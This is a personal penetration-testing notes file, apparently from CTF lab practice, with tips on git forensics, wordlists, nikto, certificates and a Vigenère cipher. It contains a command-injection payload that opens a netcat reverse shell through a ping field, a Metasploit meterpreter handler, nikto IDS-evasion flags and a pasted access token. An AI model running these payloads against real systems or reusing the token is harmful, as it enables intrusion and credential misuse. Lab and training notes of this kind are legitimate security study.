# Miscellaneous
always click around and make sure you check ALL of the functionality of a website or a service for that matter.

use `git log` to see previous commits, `git show <commit>` to see the edited contents and `git checkout <commit>` to see the files(Very important) or `git reset --hard <commit>` to restore files.

`dnsrecon` is a good idea when checking for certificates and domain names.

You should ALWAYS try using the app as a user if you have the chance to. Learning how it functions will let you figure out how to manipulate it.

to get only uniqe letters(no copies) use the following:

```text-plain
crunch 6 6 -p oqfxvg > wordlist2.txt
```

```text-plain
apt list --upgradeable
```

`openssl req -x509 -newkey rsa:4096 -days 365 -subj '/CN=www.redteam.thm/O=Red Team THM/C=UK' -nodes -keyout thm-reverse.key -out thm-reverse.crt`

```text-plain
msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_winhttps; set lhost AttackBox_IP;set lport 4443;exploit"
```

The arguments in the above command are:

*   `req` indicates that this is a certificate signing request. Obviously, we won’t submit our certificate for signing.
*   `-x509` specifies that we want an X.509 certificate
*   `-newkey rsa:4096` creates a new certificate request and a new private key using RSA, with the key size being 4096 bits. (You can use other options for RSA key size, such as `-newkey rsa:2048`.)
*   `-days 365` shows that the validity of our certificate will be one year
*   `-subj` sets data, such as organization and country, via the command-line.
*   `-nodes` simplifies our command and does not encrypt the private key
*   `-keyout PRIVATE_KEY` specifies the filename where we want to save our private key
*   `-out CERTIFICATE` specifies the filename to which we want to write the certificate request

`cat thm-reverse.key thm-reverse.crt > thm-reverse.pem`

IDS ACESS TOKEN:

`Hr8sZjlmqahSJCGp_x9lljJKNRpct_ZUqcG_sv-KeZQAJsi2cKYCBhAtBuOFMtb4QO88rfjQdJrOZ5JuMdlCakrsK0zCdwmGpDdKOaqOZOBsSgGj-aW2uaNTYL39ou764Vv0OWmvjGEkLPwYIjPEzm3R4GNWhDkesfRWkobS3-k`

you can create a reverse shell wit ping by 

```text-x-csrc
Ping(ip: "; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.17.17.11 1234 >/tmp/f")

\xf0\x18\xd2\xbf\x86\xd8\x82\xdc\xd6\xce\x81\xde\xf6\x14c\xd9\xda\xe9\xa2\x89\xb7\xda\xc8\x1d
```

if you hit CTRL-ALT and an FC you can see the linux terminals, _generally_ linux distors _allocate_ 1 to 7 of them, but there could be more, _usually_ 1 or 2 is your GUI, and the rest are text logins (Old distros, 7 was the gui); or if you run `systemctl isolate multi-user` (I think it's hyphenated) it'll move it back to terminal mode without a gui (and `systemctl isolate graphical` to get back) (`telinit 3` and `telinit 5` before systemctl was common)

when uploading files in smb, make sure the file is in your current dir so that a simple `put <file>` works, no absolute path

For uncompyling python code, use `uncompyle2` or `uncompyle6`

we could also go further and use a selection of the IDS evasion modes available with `nikto` these are set with the `-e` flag:

`nikto -p3000 -T 1 2 3 -useragent <AGENT_HERE> -e 1 7 -h 10.10.16.6`

You will notice the numbering is in the same position. So, this is either a vigenere cipher or a Ceaser cipher.

To obtain the key, simply do a reverse key search based on the vigenere table. 

The left letter bar represents plaintext, the upper letter bar represents key (either one, the table is symmetrical) and the inner table is ciphertext. Let’s take the second letter and compare it.

```text-plain
CBQOSTEFZNL5U8LJB2hhBTDvQi2zQo (Encrypted)
ANDVOWLDLAS5Q8OQZ2tu           (Plaintext)
```

```text-plain
B (Encrypt)
N (Plaintext)
O (Key)
```

![vigenere table](Miscellaneous/14.png)

Git
---

use githack.py to get source code of files. `/.git/logs/HEAD` has the info on the commits and previous history, to look into a specific object, go to `/.git/objects/79/c9539b6566b06d6dec2755fdf58f5f9ec8822f` (after the first two letters of the object, there's a sub-directory). We need a dummy git folder locally to read the file.

```text-plain
git init
```

create folder `79` in `/.git/objects/` and place the (two first character missing) file in that folder, then use 

```text-plain
git cat-file -p 79c9539b6566b06d6dec2755fdf58f5f9ec8822f
```

to cat the file